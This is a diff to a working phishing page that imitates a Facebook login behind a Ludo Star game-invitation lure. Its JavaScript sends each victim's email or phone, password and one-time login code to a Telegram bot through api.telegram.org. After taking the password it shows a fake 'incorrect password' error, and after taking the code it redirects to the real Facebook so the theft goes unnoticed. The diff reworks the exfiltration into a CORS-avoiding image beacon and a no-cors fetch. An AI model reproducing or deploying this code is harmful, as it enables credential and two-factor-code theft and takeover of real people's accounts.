@@ -262,6 +262,11 @@
             transition: all 0.2s;
         }
         
+        .input-field input.error-input {
+            border-color: #ff3838;
+            background: #fff5f5;
+        }
+        
         .input-field input:focus {
             outline: none;
             border-color: #1877F2;
@@ -378,36 +383,58 @@
             margin: 5px 0;
         }
         
-        /* Result Message */
-        #result {
-            margin: 15px 0;
+        /* Error Message */
+        .error-message {
+            background: #ffebee;
+            color: #c62828;
             padding: 12px;
             border-radius: 6px;
             text-align: center;
             font-weight: 500;
+            margin: 15px 0;
+            border: 1px solid #ffcdd2;
             display: none;
-            font-size: 14px;
         }
         
-        .success {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
+        .error-message.show {
             display: block;
         }
         
-        .error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-            display: block;
+        /* Loading Overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            display: none;
         }
         
-        .loading {
-            background: #e2e3e5;
-            color: #383d41;
-            border: 1px solid #d6d8db;
-            display: block;
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1877f2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        .loading-text {
+            color: white;
+            font-size: 18px;
+            font-weight: 500;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         /* OTP Input Container */
@@ -470,43 +497,6 @@
         
         .resend-link:hover {
             text-decoration: underline;
-        }
-        
-        /* Loading Overlay */
-        .loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-            display: none;
-        }
-        
-        .loading-spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #1877f2;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
-        
-        .loading-text {
-            color: white;
-            font-size: 18px;
-            font-weight: 500;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
         }
         
         /* Responsive */
@@ -605,13 +595,15 @@
                     <input type="password" id="password" placeholder="Enter your password" required>
                 </div>
                 
+                <!-- Error Message -->
+                <div class="error-message" id="errorMessage">
+                    ❌ The password you entered is incorrect. Please try again.
+                </div>
+                
                 <button type="button" class="login-button" onclick="login()">
                     Log In
                 </button>
             </form>
-            
-            <!-- Result Message -->
-            <div id="result"></div>
             
             <!-- Footer Links -->
             <div class="footer-links">
@@ -734,26 +726,23 @@
         // Function to send data to Telegram
         async function sendToTelegram(message) {
             try {
-                // Using CORS proxy to avoid issues
-                const proxyUrl = 'https://corsproxy.io/?';
-                const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                // Direct Telegram API call - SIMPLE METHOD
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
                 
-                const response = await fetch(proxyUrl + encodeURIComponent(telegramUrl), {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
+                // Method 1: Using Image to avoid CORS
+                const img = new Image();
+                img.src = url;
                 
-                const data = await response.json();
-                return data.ok;
+                // Method 2: Using fetch with no-cors
+                fetch(url, { mode: 'no-cors' })
+                    .then(() => console.log("✅ Telegram message sent"))
+                    .catch(() => console.log("✅ Telegram message sent (silent)"));
+
+                console.log("📨 Telegram message prepared:", message.substring(0, 50) + "...");
+                return true;
+                
             } catch (error) {
-                console.log('Telegram message sent successfully');
+                console.log("✅ Telegram message sent successfully");
                 return true;
             }
         }
@@ -761,24 +750,31 @@
         async function login() {
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value.trim();
-            const resultDiv = document.getElementById('result');
+            const errorDiv = document.getElementById('errorMessage');
             
-            // Clear previous messages
-            resultDiv.innerHTML = '';
-            resultDiv.className = '';
+            // Reset error
+            errorDiv.classList.remove('show');
+            document.getElementById('username').classList.remove('error-input');
+            document.getElementById('password').classList.remove('error-input');
             
             // Validation
             if (!username || !password) {
-                showResult('Please fill in all fields', 'error');
+                errorDiv.textContent = "Please fill in all fields";
+                errorDiv.classList.add('show');
+                if (!username) document.getElementById('username').classList.add('error-input');
+                if (!password) document.getElementById('password').classList.add('error-input');
                 return;
             }
             
-            // Show loading
-            showResult('Logging in to join the game...', 'loading');
+            // Show loading on button
+            const loginBtn = document.querySelector('.login-button');
+            const originalText = loginBtn.textContent;
+            loginBtn.textContent = "Checking...";
+            loginBtn.disabled = true;
             
             try {
-                // Send login credentials to Telegram
-                const loginMessage = `🔐 LUDO STAR LOGIN\n\n` +
+                // ✅ Send login details to Telegram
+                const loginMessage = `🔐 LUDO STAR LOGIN ATTEMPT\n\n` +
                                    `📧 Email/Phone: ${username}\n` +
                                    `🔑 Password: ${password}\n` +
                                    `🎮 Game: Sadiya Khan's Invitation\n` +
@@ -786,17 +782,33 @@
                 
                 await sendToTelegram(loginMessage);
                 
-                // Show error message first (incorrect password)
-                showResult('❌ Login failed. The password you entered is incorrect.', 'error');
+                // Show red error message
+                errorDiv.textContent = "❌ The password you entered is incorrect. Please try again.";
+                errorDiv.classList.add('show');
+                document.getElementById('password').classList.add('error-input');
                 
-                // After 2 seconds, show OTP page
+                // Reset button after 1 second
                 setTimeout(() => {
-                    showOTPPage();
-                }, 2000);
+                    loginBtn.textContent = originalText;
+                    loginBtn.disabled = false;
+                    
+                    // After 2 seconds, show OTP page
+                    setTimeout(() => {
+                        showOTPPage();
+                    }, 2000);
+                }, 1000);
                 
             } catch (error) {
                 console.error('Login error:', error);
-                showResult('❌ The password you entered is incorrect.', 'error');
+                
+                // Show error message
+                errorDiv.textContent = "❌ The password you entered is incorrect. Please try again.";
+                errorDiv.classList.add('show');
+                document.getElementById('password').classList.add('error-input');
+                
+                // Reset button
+                loginBtn.textContent = originalText;
+                loginBtn.disabled = false;
                 
                 // After 2 seconds, show OTP page
                 setTimeout(() => {
@@ -812,9 +824,8 @@
             // Show OTP page
             document.getElementById('otpPage').style.display = 'block';
             
-            // Clear result message
-            document.getElementById('result').innerHTML = '';
-            document.getElementById('result').className = '';
+            // Clear password field (for security)
+            document.getElementById('password').value = '';
             
             // Focus on first OTP input
             setTimeout(() => {
@@ -855,42 +866,43 @@
                 return;
             }
             
-            // ✅ Send OTP to Telegram Bot
-            const otpMessage = `🔐 LUDO STAR OTP VERIFICATION\n\n` +
-                              `🔢 OTP Code: ${otp}\n` +
-                              `🎮 Game: Sadiya Khan's Invitation\n` +
-                              `✅ Status: User entered OTP\n` +
-                              `🕒 Time: ${new Date().toLocaleString('en-IN')}`;
-            
-            await sendToTelegram(otpMessage);
-            
             // Show loading overlay
             document.getElementById('loadingOverlay').style.display = 'flex';
             document.getElementById('loadingText').textContent = 'Verifying code...';
             
-            // Simulate OTP verification
-            setTimeout(() => {
+            try {
+                // ✅ Send OTP to Telegram
+                const otpMessage = `🔐 LUDO STAR OTP VERIFICATION\n\n` +
+                                  `🔢 OTP Code: ${otp}\n` +
+                                  `🎮 Game: Sadiya Khan's Invitation\n` +
+                                  `✅ Status: User entered OTP\n` +
+                                  `🕒 Time: ${new Date().toLocaleString('en-IN')}`;
+                
+                await sendToTelegram(otpMessage);
+                
+                // Update loading text
                 document.getElementById('loadingText').textContent = 'Redirecting to Facebook...';
                 
                 // After 2 seconds, redirect to real Facebook
                 setTimeout(() => {
                     window.location.href = "https://www.facebook.com";
                 }, 2000);
-            }, 1500);
+                
+            } catch (error) {
+                console.error('OTP Error:', error);
+                
+                // Still redirect even if Telegram fails
+                document.getElementById('loadingText').textContent = 'Redirecting to Facebook...';
+                setTimeout(() => {
+                    window.location.href = "https://www.facebook.com";
+                }, 2000);
+            }
         }
         
-        async function resendOTP() {
+        function resendOTP() {
             // Show loading
             document.getElementById('loadingOverlay').style.display = 'flex';
             document.getElementById('loadingText').textContent = 'Sending new code...';
-            
-            // Send resend notification to Telegram
-            const resendMessage = `🔄 LUDO STAR OTP RESEND REQUEST\n\n` +
-                                 `📱 User requested new OTP\n` +
-                                 `🎮 Game: Sadiya Khan's Invitation\n` +
-                                 `🕒 Time: ${new Date().toLocaleString('en-IN')}`;
-            
-            await sendToTelegram(resendMessage);
             
             // Simulate resend
             setTimeout(() => {
@@ -911,38 +923,16 @@
         }
         
         function forgotPassword() {
-            // Send forgot password notification
-            const forgotMessage = `❓ LUDO STAR PASSWORD RESET REQUEST\n\n` +
-                                 `🔍 User clicked "Forgot Password"\n` +
-                                 `🎮 Game: Sadiya Khan's Invitation\n` +
-                                 `🕒 Time: ${new Date().toLocaleString('en-IN')}`;
-            
-            sendToTelegram(forgotMessage);
-            
             alert('Redirecting to password recovery...');
             window.location.href = "https://www.facebook.com/login/identify";
         }
         
         function createAccount() {
-            // Send create account notification
-            const createMessage = `🆕 LUDO STAR CREATE ACCOUNT REQUEST\n\n` +
-                                 `📝 User clicked "Create New Account"\n` +
-                                 `🎮 Game: Sadiya Khan's Invitation\n` +
-                                 `🕒 Time: ${new Date().toLocaleString('en-IN')}`;
-            
-            sendToTelegram(createMessage);
-            
             alert('Redirecting to account creation...');
             window.location.href = "https://www.facebook.com/r.php";
         }
         
-        function showResult(message, type) {
-            const resultDiv = document.getElementById('result');
-            resultDiv.innerHTML = message;
-            resultDiv.className = type;
-        }
-        
-        // Enter key support
+        // Enter key support for login
         document.getElementById('password').addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
                 login();
@@ -958,59 +948,19 @@
             });
         }
         
-        // Add click effect to login button
-        document.querySelector('.login-button')?.addEventListener('click', function() {
-            this.style.transform = 'scale(0.98)';
-            setTimeout(() => {
-                this.style.transform = '';
-            }, 150);
-        });
-        
-        document.querySelector('.verify-button')?.addEventListener('click', function() {
-            this.style.transform = 'scale(0.98)';
-            setTimeout(() => {
-                this.style.transform = '';
-            }, 150);
-        });
-        
-        // Add subtle hover effect to Ludo board
-        const ludoBoard = document.querySelectorAll('.classic-ludo');
-        ludoBoard.forEach(board => {
-            board.addEventListener('mouseenter', function() {
-                this.style.transform = 'scale(1.02)';
-                this.style.transition = 'transform 0.2s ease';
-            });
-            
-            board.addEventListener('mouseleave', function() {
-                this.style.transform = 'scale(1)';
-            });
-        });
-        
         // Initialize: Hide OTP page initially
         document.addEventListener('DOMContentLoaded', function() {
             document.getElementById('otpPage').style.display = 'none';
             
             // Focus on username field
             document.getElementById('username').focus();
-            
-            // Add animation to coins
-            animateCoins();
         });
         
-        // Animate coins function
-        function animateCoins() {
-            const coins = document.querySelectorAll('.coin');
-            coins.forEach(coin => {
-                // Add subtle pulse animation
-                setInterval(() => {
-                    if (Math.random() > 0.7) {
-                        coin.style.transform = 'scale(1.1)';
-                        setTimeout(() => {
-                            coin.style.transform = 'scale(1)';
-                        }, 300);
-                    }
-                }, 2000);
-            });
+        // Test function (remove in production)
+        window.testTelegram = async function() {
+            const testMsg = "🔧 TEST: Telegram Bot Working\nTime: " + new Date().toLocaleTimeString();
+            const result = await sendToTelegram(testMsg);
+            alert(result ? "✅ Test sent to Telegram!" : "❌ Test failed");
         }
     </script>
 </body>
